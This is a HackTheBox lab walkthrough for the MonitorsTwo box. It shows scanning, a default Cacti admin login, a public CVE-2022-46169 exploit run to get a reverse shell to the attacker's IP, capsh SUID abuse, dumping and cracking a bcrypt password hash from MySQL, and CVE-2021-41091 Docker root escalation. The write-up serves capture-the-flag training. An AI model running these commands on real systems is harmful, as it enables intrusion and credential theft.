---
title: HTB - MonitorsTwo
author: nirajkharel
date: 2023-09-03 14:10:00 +0800
categories: [HackTheBox]
tags: [HTB, HackTheBox]
render_with_liquid: false
---


HTB — MonitorsTwo
================

A detailed walkthrough for solving MonitorsTwo on HTB. The box contains vulnerability like default credentials, CVE-2022–46169 Cacti Remote Code Execution and Privilege Escalation through Docker CVE-2021–41091.

![](https://cdn-images-1.medium.com/max/2000/1*J6pL9swXinIJFvlp7X6tdQ.png)

## Enumeration

### NMAP

Let’s start with a NMAP Scanning to enumerate open ports and the services running on the IP.

    nmap -sC -sV -oA nmap/10.10.11.211 10.10.11.211 -vv

    PORT   STATE SERVICE REASON  VERSION
    22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey: 
    |   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
    | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC82vTuN1hMqiqUfN+Lwih4g8rSJjaMjDQdhfdT8vEQ67urtQIyPszlNtkCDn6MNcBfibD/7Zz4r8lr1iNe/Afk6LJqTt3OWewzS2a1TpCrEbvoileYAl/Feya5PfbZ8mv77+MWEA+kT0pAw1xW9bpkhYCGkJQm9OYdcsEEg1i+kQ/ng3+GaFrGJjxqYaW1LXyXN1f7j9xG2f27rKEZoRO/9HOH9Y+5ru184QQXjW/ir+lEJ7xTwQA5U1GOW1m/AgpHIfI5j9aDfT/r4QMe+au+2yPotnOGBBJBz3ef+fQzj/Cq7OGRR96ZBfJ3i00B/Waw/RI19qd7+ybNXF/gBzptEYXujySQZSu92Dwi23itxJBolE6hpQ2uYVA8VBlF0KXESt3ZJVWSAsU3oguNCXtY7krjqPe6BZRy+lrbeska1bIGPZrqLEgptpKhz14UaOcH9/vpMYFdSKr24aMXvZBDK1GJg50yihZx8I9I367z0my8E89+TnjGFY2QTzxmbmU=
    |   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
    | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBH2y17GUe6keBxOcBGNkWsliFwTRwUtQB3NXEhTAFLziGDfCgBV7B9Hp6GQMPGQXqMk7nnveA8vUz0D7ug5n04A=
    |   256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
    |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKfXa+OM5/utlol5mJajysEsV4zb/L0BJ1lKxMPadPvR
    80/tcp open  http    syn-ack nginx 1.18.0 (Ubuntu)
    |_http-favicon: Unknown favicon MD5: 4F12CCCD3C42A4A478F067337FE92794
    |_http-title: Login to Cacti
    |_http-server-header: nginx/1.18.0 (Ubuntu)
    | http-methods: 
    |_  Supported Methods: GET HEAD POST OPTIONS
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Discovered two open ports 22 and 80 which are for SSH and HTTP.

    cat /etc/hosts
    # Host addresses
    127.0.0.1  localhost
    127.0.1.1  parrot
    10.10.11.211    monitorstwo.htb
    ::1        localhost ip6-localhost ip6-loopback
    ff02::1    ip6-allnodes
    ff02::2    ip6-allrouters
    # Others

On exploring the web application, I found an application called Cacti was installed on the port 80 which requires username and password to proceed further.

![](https://cdn-images-1.medium.com/max/3058/1*2dINra7YS7AGYV2It-TcmA.png)

I will come back to the application in some time. For now let’s explore if the application contains any additional directories on it.

### Directory Enumeration

**Dirsearch**

    python3 dirsearch.py -u http://monitorstwo.htb/ -i 200,301,302,303    
    
      _|. _ _  _  _  _ _|_    v0.4.3
     (_||| _) (/_(_|| (_| )
    
    Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11710
    
    
    Target: http://monitorstwo.htb/
    
    [22:06:49] Starting: 
    [22:07:18] 200 -    0B  - /1.php
    [22:07:25] 200 -   13KB - /about.php
    [22:07:59] 302 -    0B  - /cache/  ->  ../index.php
    [22:07:59] 301 -  313B  - /cache  ->  http://monitorstwo.htb/cache/
    [22:08:03] 200 -   93B  - /cmd.php
    [22:08:11] 200 -  249KB - /CHANGELOG
    [22:08:16] 301 -  312B  - /docs  ->  http://monitorstwo.htb/docs/
    [22:08:16] 200 -   13KB - /docs/
    [22:08:30] 301 -  314B  - /images  ->  http://monitorstwo.htb/images/
    [22:08:30] 302 -    0B  - /images/  ->  ../index.php
    [22:08:31] 301 -  315B  - /include  ->  http://monitorstwo.htb/include/
    [22:08:31] 302 -    0B  - /include/  ->  ../index.php
    [22:08:33] 301 -  315B  - /install  ->  http://monitorstwo.htb/install/
    [22:08:33] 302 -    0B  - /install/  ->  install.php
    [22:08:33] 302 -    0B  - /install/index.php?upgrade/  ->  install.php
    [22:08:37] 301 -  311B  - /lib  ->  http://monitorstwo.htb/lib/
    [22:08:37] 302 -    0B  - /lib/  ->  ../index.php
    [22:08:38] 200 -   13KB - /links.php
    [22:08:38] 200 -   15KB - /LICENSE
    [22:08:41] 302 -    0B  - /logout.php  ->  index.php
    [22:09:00] 302 -    0B  - /plugins/  ->  ../index.php
    [22:09:00] 301 -  315B  - /plugins  ->  http://monitorstwo.htb/plugins/
    [22:09:05] 200 -   11KB - /README.md
    [22:09:07] 301 -  316B  - /resource  ->  http://monitorstwo.htb/resource/
    [22:09:09] 302 -    0B  - /scripts/  ->  ../index.php
    [22:09:09] 301 -  315B  - /scripts  ->  http://monitorstwo.htb/scripts/
    [22:09:10] 301 -  315B  - /service  ->  http://monitorstwo.htb/service/
    [22:09:10] 301 -  320B  - /service?Wsdl  ->  http://monitorstwo.htb/service/?Wsdl

I discovered some weird endpoints like **cmd.php** as well. Opening the endpoint it shows that the script is only meant to run at the command line. Looks like fishy, although.

![](https://cdn-images-1.medium.com/max/2218/1*JH5TaXzSVfbH0kFwT1o6oA.png)

Since we knew the application contains PHP as backend, let’s enumerate if we could discover any other PHP endpoints using Gobuster.

**Gobuster**

    gobuster dir -u http://monitorstwo.htb/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php
    
    ===============================================================
    Gobuster v3.1.0
    by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
    ===============================================================
    [+] Url:                     http://monitorstwo.htb/
    [+] Method:                  GET
    [+] Threads:                 10
    [+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
    [+] Negative Status codes:   404
    [+] User Agent:              gobuster/3.1.0
    [+] Extensions:              php
    [+] Timeout:                 10s
    ===============================================================
    2023/05/12 22:17:04 Starting gobuster in directory enumeration mode
    ===============================================================
    /images               (Status: 301) [Size: 314] [--> http://monitorstwo.htb/images/]
    /index.php            (Status: 200) [Size: 13844]                                   
    /about.php            (Status: 200) [Size: 13844]                                   
    /1.php                (Status: 200) [Size: 0]                                       
    /links.php            (Status: 200) [Size: 13844]                                   
    /help.php             (Status: 200) [Size: 13843]                                   
    /docs                 (Status: 301) [Size: 312] [--> http://monitorstwo.htb/docs/]  
    /link.php             (Status: 302) [Size: 0] [--> index.php]                       
    /scripts              (Status: 301) [Size: 315] [--> http://monitorstwo.htb/scripts/]
    /service              (Status: 301) [Size: 315] [--> http://monitorstwo.htb/service/]
    Progress: 840 / 441122 (0.19%)                                                      [ERROR] 2023/05/12 22:20:09 [!] Get "http://monitorstwo.htb/international.php": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
    /plugins              (Status: 301) [Size: 315] [--> http://monitorstwo.htb/plugins/]
    /plugins.php          (Status: 200) [Size: 13846]                                    
    /sites.php            (Status: 200) [Size: 13844]                                    
    /log                  (Status: 403) [Size: 276]                                      
    /install              (Status: 301) [Size: 315] [--> http://monitorstwo.htb/install/]
    /lib                  (Status: 301) [Size: 311] [--> http://monitorstwo.htb/lib/]    
    /utilities.php        (Status: 200) [Size: 13848]                                    
    /resource             (Status: 301) [Size: 316] [--> http://monitorstwo.htb/resource/]
    /cache                (Status: 301) [Size: 313] [--> http://monitorstwo.htb/cache/]   
    /include              (Status: 301) [Size: 315] [--> http://monitorstwo.htb/include/] 
    /logout.php           (Status: 302) [Size: 0] [--> index.php]                         
    /settings.php         (Status: 200) [Size: 13847]                                     
    /graph.php            (Status: 200) [Size: 13828]                                     
    /host.php             (Status: 200) [Size: 13843]                                     
    /color.php            (Status: 200) [Size: 13844]                                     
    /graphs.php           (Status: 200) [Size: 13845]                                     
    /LICENSE              (Status: 200) [Size: 15171]                                     
    /tree.php             (Status: 200) [Size: 13843]    

Gobuster was taking much time and was responding with timeout error. So I decided to explore the web application manually.

## Initial Access

### Default Credentials

I searched for the default credentials of Cacti, and found **admin:admin** as username and password. Tried to same credentials in the login panel and successfully accessed the admin portal.

![](https://cdn-images-1.medium.com/max/3824/1*_NomrNLVz_jo58WO52g0sg.png)

Although the admin access was gained on the application, I didn’t discovered any endpoints which could have been vulnerable.

### Remote Code Execution

The installed Cacti version was 1.2.22 and I looked for the existing vulnerabilities on the particular version and found that it is affected with Remote Code Execution.

Download the exploit from below link.
[GitHub - FredBrave/CVE-2022-46169-CACTI-1.2.22:](https://github.com/FredBrave/CVE-2022-46169-CACTI-1.2.22)

![](https://cdn-images-1.medium.com/max/2502/1*xGlzneA1UC3hDhqm3bkWYw.png)

Setup a netcat listener.

    nc -lvnp 4444

Navigate into the downloaded payload and execute below command.

    python3 CVE-2022-46169.py -u http://monitorstwo.htb --LHOST=10.10.14.57 --LHOST=4444

![](https://cdn-images-1.medium.com/max/2000/1*R1v2Hqrva-9SscjMBjUo_g.png)

And we got the reverse shell on our device. Despite we got the shell, the user was www-data and when I navigated into the home directory, there was no any users listed. We should escalate this www-data user in this machine to get the user flag.

![](https://cdn-images-1.medium.com/max/2000/1*2nGq6-i7IouycKyMl8kZ4A.png)

Navigating into the / directory, I found a bash file called entrypoint.sh which looks interesting.

![](https://cdn-images-1.medium.com/max/2000/1*439c-B_xr6fDKrME0zWQVw.png)

Viewing the content of the file, it shows that it contains some database commands. Since we do not have write access on the file, we were not able to gain information other than the name of tables while running the script.

Let’s try for local privilege escalation at first. On viewing the executable with having SUID permission, I found capsh which is related to capability testing and environment creation.

![](https://cdn-images-1.medium.com/max/2000/1*VPbtymCAUjAcWyaxuSJkYg.png)

Searching for SUID permission abuse for capsh in GTFObin, I discovered that we can escalate the permission though it.

![](https://cdn-images-1.medium.com/max/2024/1*x-d35gN0Ej4_LIJyUnfRnA.png)

Enter the command provided by GTFObin and I was able to gain the root access.

![](https://cdn-images-1.medium.com/max/2000/1*Juc7uQN2IVn7wNta8f_xVQ.png)

After getting the root access, I did not find any flags on there as well. There were no any users on the home directory as well. Might be as the name suggests “MonitorsTwo”, there might be another host/monitor that we need to access in order to proceed further.

![](https://cdn-images-1.medium.com/max/2000/1*MIqvT9BpghIxosfiFX94Hg.png)

The above file .dockerenv suggests that the reverse shell we gained from above exploit was a docker environment. There was a file in the / directory called entrypoint.sh, as the name suggest it might be the entry point for us. Let’s view the file.

![](https://cdn-images-1.medium.com/max/2000/1*F-4UkpXkk6sb3O8dk7_ZmA.png)

Executing the script, we can see that it lists the tables from the database which is programmed on bash file. The command on the bash file which was responsible for listing the table was;

    mysql --host=db --user=root --password=root_cacti -e 'show_tables'

![](https://cdn-images-1.medium.com/max/2000/1*AUl5FR6vSUQ6_z3N-ajjqg.png)

Going through the listed tables, we found an interesting one as user_auth. This table might hold some interesting values like username, password since it is related to the authentication.

![](https://cdn-images-1.medium.com/max/2000/1*-qcph2PQW3C-zSryel761Q.png)

Since we already have the mysql configuration, we can dump the table user_auth using below command.

    mysql --host=db --user=root --password=root cacti -e 'select * from user_auth'

As we can see that we have dumped the credential for admin, guest and marcus. We already have the password of admin as admin and we do not need the guest credential as of now so we will narrow down to a user called marcus.

![](https://cdn-images-1.medium.com/max/2000/1*PQinYsZMLv3P0ef2mwYlcA.png)

    marcus $2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW/MhFYK4C 0 Marcus Brune marcus@monitorstwo.htb

Looking for the hash type of the password for marcus, we can see that it is a bcrypt hash.

![](https://cdn-images-1.medium.com/max/2000/1*sHou1zfIZU8UamdDMyl-XA.png)

Verifying the hash type using hashid we can confirm that it is bcrypt hash.

    hashid 
    $2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW/MhFYK4C
    Analyzing '$2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW/MhFYK4C'
    [+] Blowfish(OpenBSD) 
    [+] Woltlab Burning Board 4.x 
    [+] bcrypt 

Save the hash on a text file.

    cat hash
    $2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW/MhFYK4C

Run hashcat tool to identify the plaintext of it. The mode for bcrypt hash is 3200.

    hashcat -m 3200 hash /usr/share/wordlists/rockyou.txt

We were able to crack the hash and the password is “funkymonkey”.

![](https://cdn-images-1.medium.com/max/2000/1*mArCuRNZzvm8WFaTBE6DUQ.png)

Let’s see if the credential is reused for SSH.

    ssh marcus@monitorstwo.htb
    Password: funkymonkey

We got the access to the marcus user using the above credential.

![](https://cdn-images-1.medium.com/max/2000/1*Cy3QsqqnRBGV4P6IxoV-Fg.png)

View the user.txt file.

![](https://cdn-images-1.medium.com/max/2000/1*PrR-KXrawVU6IP3xNFWq5Q.png)

## Privilege Escalation

As we know that the box contains docker installed, let’s find if the installed docker version contains any vulnerabilities or not.

Enumerate the version of the installed docker.

    marcus@monitorstwo:~$ docker --version
    Docker version 20.10.5+dfsg1, build 55c4c88

On searching for the installed version, I found that it is vulnerable to local privilege escalation. Download the exploit from below link.
[GitHub - UncleJ4ck/CVE-2021-41091: POC for CVE-2021-41091](https://github.com/UncleJ4ck/CVE-2021-41091)

I am not going into the explanation of the vulnerability this time. You can simply navigate into the above link for it.

![](https://cdn-images-1.medium.com/max/2000/1*14Nxcx1bK8evtL216rEIJQ.png)

Download the exploit using below command.

    git clone https://github.com/UncleJ4ck/CVE-2021-41091

![](https://cdn-images-1.medium.com/max/2000/1*UFSjXqsA6zvQR2Qr0LBuNw.png)

Host the exploit and transfer the script to the box. Execute the script. The script assign **/bin/bash** with SUID permission and stores it into **/var/lib/docker/overlay2/<some-kind-of-UUID-maybe>/merged**.

![](https://cdn-images-1.medium.com/max/2000/1*QcwXTQHPylMBvQ_Io9Q7WQ.png)

On executing the new bash file with -p command, we can get the root access into the machine.

!! Happy Hacking !!
